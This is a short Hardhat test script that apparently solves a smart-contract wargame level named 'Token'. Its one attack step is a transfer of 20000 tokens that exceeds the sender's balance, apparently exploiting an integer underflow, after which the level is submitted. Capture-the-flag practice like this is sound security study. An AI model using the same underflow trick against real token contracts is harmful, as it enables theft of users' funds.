import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  // Update to match the target contract
  const challengeFactory = await ethers.getContractFactory(`Token`);
  const challengeAddress = await createChallenge(
    `0x63bE8347A617476CA461649897238A31835a32CE`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    const address = await eoa.getAddress();
    const result = await challenge.transfer(accounts[1].getAddress(), 20000);
    const balance = await challenge.balanceOf(address);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
